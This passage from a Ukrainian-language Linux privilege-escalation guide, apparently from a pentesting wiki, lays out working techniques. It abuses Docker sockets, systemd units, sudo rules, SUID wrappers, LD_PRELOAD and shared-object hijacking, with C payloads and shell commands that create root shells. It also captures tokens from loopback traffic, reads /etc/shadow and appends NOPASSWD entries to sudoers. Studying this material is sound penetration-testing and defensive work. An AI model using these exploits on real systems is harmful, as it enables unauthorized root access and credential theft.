Якщо ви знайдете **файл `.socket`, доступний для запису**, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед створенням сокету. Тому, **ймовірно, доведеться зачекати до перезавантаження машини.**\
_Зверніть увагу, що система має використовувати цю конфігурацію socket-файлу, інакше backdoor не буде виконаний_

### Socket activation + writable unit path (create missing service)

Інша серйозна неправильна конфігурація:

- a socket unit with `Accept=no` and `Service=<name>.service`
- the referenced service unit is missing
- an attacker can write into `/etc/systemd/system` (or another unit search path)

У такому випадку атакуючий може створити `<name>.service`, а потім спрямувати трафік до сокета, щоб systemd підвантажив і виконав нову службу як root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

Якщо ви **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), то **ви можете спілкуватися** з цим socket і, можливо, exploit a vulnerability.

### Перелічення Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зауважте, що можуть бути деякі **sockets listening for HTTP** requests (_я не говорю про .socket файли, а про файли, що виконують роль unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Якщо socket **відповідає на HTTP-запит**, то ви можете з ним **спілкуватися** і, можливо, **використати якусь вразливість**.

### Docker socket, доступний для запису

Docker socket, який часто знаходиться за адресою `/var/run/docker.sock`, — це критичний файл, який потрібно захищати. За замовчуванням він доступний для запису користувачу `root` та учасникам групи `docker`. Наявність прав запису до цього socket може призвести до privilege escalation. Нижче наведено розбір того, як це можна зробити, а також альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є права запису до Docker socket, ви можете виконати privilege escalation за допомогою таких команд:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з root-доступом до файлової системи хоста.

#### **Using Docker API Directly**

У випадках, коли Docker CLI недоступний, Docker socket все ще можна контролювати за допомогою Docker API і команд `curl`.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надіслати запит на створення контейнера, який монтує кореневий каталог хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` щоб встановити з'єднання з сокетом Docker, що дозволяє виконувати команди в контейнері.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання `socat`, ви зможете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Others

Зверніть увагу, що якщо ви маєте права запису до docker socket, оскільки ви є в групі `docker`, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **more ways to break out from containers or abuse container runtimes to escalate privileges** у:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система міжпроцесної взаємодії (inter-Process Communication, IPC), яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної Linux-системи, вона пропонує надійну основу для різних форм комунікації між додатками.

Система універсальна: вона підтримує базовий IPC, що покращує обмін даними між процесами, подібно до розширених UNIX domain sockets. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від демона Bluetooth про вхідний дзвінок може підказати музичному програвачу вимкнути звук, покращуючи користувацький досвід. Також D-Bus підтримує систему віддалених об'єктів, що спрощує запити сервісів і виклики методів між додатками, оптимізуючи процеси, які раніше були складними.

D-Bus працює за моделлю **allow/deny**, керуючи дозволами на повідомлення (виклики методів, емісію сигналів тощо) на основі кумулятивного ефекту відповідних правил політик. Ці політики визначають взаємодії з шиною, потенційно дозволяючи privilege escalation через експлуатацію цих дозволів.

Наведено приклад такої політики у `/etc/dbus-1/system.d/wpa_supplicant.conf`, який деталізує дозволи для користувача root на володіння, відправлення та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без зазначеного користувача чи групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate та exploit D-Bus комунікацію тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу та з'ясувати розташування машини.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Швидкий триаж фільтрації вихідного трафіку

Якщо хост може виконувати команди, але callbacks не працюють, швидко розділіть перевірку DNS, transport, proxy та route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти перед доступом до неї:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Класифікуйте listeners за bind target:

- `0.0.0.0` / `[::]`: доступні на всіх локальних інтерфейсах.
- `127.0.0.1` / `::1`: лише локально (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Робочий процес триажу локальних сервісів

Коли ви скомпрометуєте хост, сервіси, прив'язані до `127.0.0.1`, часто вперше стають доступними з вашого shell. Швидкий локальний робочий процес:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS як мережевий сканер (режим лише мережі)

Окрім локальних PE перевірок, linPEAS може працювати як орієнтований мережевий сканер. Він використовує доступні бінарні файли в `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює додаткових інструментів.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Якщо ви передасте `-d`, `-p` або `-i` без `-t`, linPEAS поводиться як чистий мережевий сканер (пропускаючи решту перевірок privilege-escalation).

### Sniffing

Перевірте, чи можете sniff traffic. Якщо так — ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
Швидкі практичні перевірки:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) особливо цінний у post-exploitation, тому що багато внутрішніх сервісів мають там tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Захопіть зараз, проаналізуйте пізніше:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Користувачі

### Загальна перевірка

Перевірте, **хто** ви, які **привілеї** у вас є, які **користувачі** є в системах, хто може **login** і які мають **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були уражені багом, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатуйте це за допомогою:** **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якоїсь групи**, яка може надати вам root-привілеї:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи в буфері обміну є щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

If you **знаєте будь-який пароль** середовища **спробуйте увійти як кожного користувача**, використовуючи цей пароль.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Зловживання записуваними елементами $PATH

### $PATH

If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user (root ideally) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певну команду за допомогою sudo, або вони можуть мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **несподівані команди дозволяють читати і/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація sudo може дозволити користувачеві виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тож отримати shell тепер тривіально — достатньо додати ssh key у каталог root або викликати `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python library під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете скористатися поведінкою неінтерактивного запуску Bash, щоб виконати довільний код як root під час виклику дозволеної команди.

- Чому це працює: Для неінтерактивних оболонок Bash оцінює `$BASH_ENV` і підключає (sources) цей файл перед запуском цільового скрипта. Багато правил sudo дозволяють запускати скрипт або оболонку-обгортку. Якщо `BASH_ENV` зберігається sudo, ваш файл підключається з правами root.

- Вимоги:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення:
- Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
- Уникайте shell wrappers для sudo-allowed commands; використовуйте мінімальні binaries.
- Розгляньте sudo I/O logging та оповіщення, коли використовуються збережені env vars.

### Terraform через sudo зі збереженим HOME (!env_reset)

Якщо sudo залишає середовище незмінним (`!env_reset`) і при цьому дозволяє виконання `terraform apply`, `$HOME` залишається користувача, який викликає команду. Тому Terraform завантажує **$HOME/.terraformrc** як root і враховує `provider_installation.dev_overrides`.

- Вкажіть потрібний provider на директорію з правами запису і розмістіть шкідливий плагін із ім'ям провайдера (наприклад `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform не пройде Go plugin handshake, але виконає payload від root перед тим, як завершитися, залишивши SUID shell.

### TF_VAR overrides + обхід валідації symlinks

Terraform variables can be provided via `TF_VAR_<name>` environment variables, which survive when sudo preserves the environment. Weak validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` can be bypassed with symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform розв'язує symlink і копіює реальний `/root/root.txt` у місце, доступне для читання атакуючим. Той самий підхід можна використати для **запису** у привілейовані шляхи шляхом попереднього створення цільових symlinks (наприклад, вказавши provider’s destination path всередині `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старіших дистрибутивах sudo може бути налаштовано з `requiretty`, що змушує sudo виконуватися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або опція відсутня), sudo можна виконувати з неінтерактивних контекстів, таких як reverse shells, cron jobs, або скрипти.
```bash
Defaults !requiretty
```
Це саме по собі не є прямою вразливістю, але розширює випадки, коли правила sudo можуть бути зловживані без необхідності повного PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, який містить записи, доступні для запису атакуючому (наприклад, `/home/<user>/bin`), будь-яка відносна команда всередині дозволеного sudo-цільового файлу може бути підмінена.

- Вимоги: правило sudo (часто `NOPASSWD`), що запускає скрипт/бінарний файл, який викликає команди без абсолютних шляхів (`free`, `df`, `ps`, тощо), та запис у PATH, доступний для запису і який перевіряється першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Обхід виконання Sudo через шляхи
**Перейдіть** щоб прочитати інші файли або використайте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це навіть простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказаного шляху до команди

Якщо користувачу надано **дозвіл sudo** для однієї команди **без вказування шляху**: _hacker10 ALL= (root) less_ — ви можете експлуатувати це, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна застосувати, якщо **suid** binary **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary із вказаним шляхом до команди

Якщо **suid** binary **виконує іншу команду з вказаним шляхом**, то ви можете спробувати **export a function** з іменем тієї команди, яку викликає suid файл.

Наприклад, якщо suid binary викликає _**/usr/sbin/service apache2 start**_ вам потрібно спробувати створити функцію та **export** її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid binary, ця функція буде виконана

### Writable script executed by a SUID wrapper

Поширена помилка конфігурації кастомного додатка — root-owned SUID binary wrapper, який виконує script, тоді як сам script доступний для запису low-priv users.

Типовий шаблон:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Якщо /usr/local/bin/backup.sh доступний для запису, ви можете дописати payload-команди, а потім виконати SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Швидкі перевірки:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** запустивши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc можна використати, якщо нападник контролює **LD_LIBRARY_PATH** env variable, оскільки він контролює шлях, де будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

При натраплянні на binary з правами **SUID**, який здається підозрілим, корисно перевірити, чи він правильно завантажує файли **.so**. Це можна перевірити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ свідчить про потенційну можливість експлуатації.

Щоб експлуатувати це, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, що містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпулювання правами доступу до файлів та запуску shell з підвищеними привілеями.

Скомпілюйте вищенаведений C файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має викликати exploit, що може призвести до system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує library з папки, в яку ми можемо записувати, створимо library у цій папці з необхідним ім'ям:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримаєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) є кураторським списком Unix-бінарів, які можуть бути використані зловмисником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) те саме, але для випадків, коли ви можете **лише додавати аргументи** до команди.

Проект збирає легітимні функції Unix-бінарів, які можна зловживати для виходу з обмежених shell-ів, ескалації або підтримки підвищених привілеїв, передачі файлів, створення bind та reverse shells, і полегшення інших post-exploitation задач.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Вимоги для ескалації привілеїв:

- У вас вже є shell як користувач "_sampleuser_"
- "_sampleuser_" **використовував `sudo`** для виконання чогось **за останні 15mins** (за замовчуванням це тривалість sudo token, що дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово встановити `ptrace_scope` у 0 за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить sudoers файл**, який робить **sudo tokens вічними та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права запису** в цю теку або на будь-які створені в ній файли, ви можете використати бінарник [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell від імені цього користувача з PID 1234, ви можете **отримати sudo privileges** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви можете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл — ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживання цими дозвіломи:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD, не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв і ви отримали shell у контексті цього користувача, ви можете **створити новий sudo виконуваний файл**, який виконає ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконує sudo, виконувався ваш sudo виконуваний файл.

